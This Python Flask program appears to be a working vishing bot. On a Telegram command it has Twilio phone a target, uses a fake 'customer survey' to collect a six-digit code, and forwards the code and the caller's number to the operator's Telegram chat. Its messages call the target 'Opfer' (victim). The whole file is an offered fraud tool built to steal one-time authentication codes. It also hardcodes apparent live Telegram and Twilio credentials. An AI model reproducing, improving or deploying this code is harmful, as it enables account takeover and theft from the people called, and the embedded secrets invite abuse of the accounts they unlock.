import os
import requests
from flask import Flask, request
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather

app = Flask(__name__)

# --- Configuración de Credenciales ---
TELEGRAM_TOKEN = "8671100191:AAGnjEeOD4LUgQJiVzNj79-nWhdnh2neh90"
CHAT_ID = "8225742299"

TWILIO_SID = "ACd39155611dc69a0f0b049a178e61a5ec"
TWILIO_AUTH = "aabbc52cd1ed16e8efbbc3d55fcff8dd"
TWILIO_NUMBER = "+19783545896"

client = Client(TWILIO_SID, TWILIO_AUTH)

# --- Funciones Auxiliares ---
def send_to_telegram(message):
    """Envía un mensaje de texto al bot de Telegram configurado."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Error enviando a Telegram: {e}")

# --- Rutas de la Aplicación ---

@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.json
    print("RECIBIDO:", data)
    return "ok", 200

@app.route("/telegram", methods=["POST"])
def telegram():
    data = request.json
    if not data or "message" not in data:
        return "ok", 200

    text = data["message"].get("text", "")
    chat_id = data["message"]["chat"]["id"]

    if text == "/start":
        url_tg = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url_tg, data={
            "chat_id": chat_id,
            "text": "𝕯𝖆𝖘 𝕿𝖔𝖔𝖑 𝖋𝖚𝖓𝖐𝖙𝖎𝖔𝖓𝖎𝖊𝖗𝖙, 𝖘𝖈𝖍𝖎𝖈𝖐𝖊𝖓 𝕾𝖎𝖊 𝖒𝖎𝖗 𝖉𝖆𝖘 𝕺𝖕𝖋𝖊𝖗 💸 ."
        })
        return "ok", 200

    if text.startswith("+"):
        # Inicia la llamada de Twilio
        client.calls.create(
            to=text,
            from_=TWILIO_NUMBER,
            url="https://bot-zyqo.onrender.com/call"
        )
        send_to_telegram(f"Llamando a {text}")
        return "ok", 200

    return "ok", 200

@app.route("/call", methods=["POST"])
def call():
    response = VoiceResponse()
    # Gather captura la entrada DTMF (teclas marcadas)
    gather = Gather(
        input="dtmf",
        num_digits=6,
        action="/rating"
    )
    gather.say("Ingrese su numero de cliente.", language="es-MX")
    response.append(gather)
    return str(response)

@app.route("/rating", methods=["POST"])
def rating():
    customer_id = request.form.get("Digits")
    response = VoiceResponse()
    
    # Pasamos el customer_id como argumento en la URL de la acción
    gather = Gather(
        input="dtmf",
        num_digits=1,
        action=f"/save?customer_id={customer_id}"
    )
    gather.say("Califique su experiencia del uno al cinco.", language="es-MX")
    response.append(gather)
    return str(response)

@app.route("/save", methods=["POST"])
def save():
    customer_id = request.args.get("customer_id")
    rating_value = request.form.get("Digits")
    phone = request.form.get("From")

    # Formateo del mensaje para Telegram
    mensaje = (
        f"⛧ 𝕹𝖊𝖚𝖊𝖘 𝕺𝖕𝖋𝖊𝖗 ⛧\n"
        f"• ℭ𝔬𝔡𝔢 :{customer_id}\n"
        f"• 𝔒𝔭𝔣𝔢𝔯: {phone}\n"
        f"• 𝔎𝔞𝔯𝔱𝔢: {rating_value}\n"
        f"⸸ 𝕸𝖊𝖎𝖓 𝖌𝖗𝖔𝖘𝖙𝖊𝖘 𝕲𝖑𝖚𝖈𝖐, 𝖉𝖊𝖎𝖓 𝖌𝖗𝖔𝖘𝖙𝖊𝖘 𝖀𝖓𝖌𝖑𝖚𝖈𝖐 ⸸"
    )
    
    send_to_telegram(mensaje)

    response = VoiceResponse()
    response.say("Gracias por su respuesta. Hasta luego.", language="es-MX")
    return str(response)

# --- Bloque de ejecución principal ---
if __name__ == "__main__":
    # Render y otros servicios de hosting usan la variable de entorno PORT
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
  
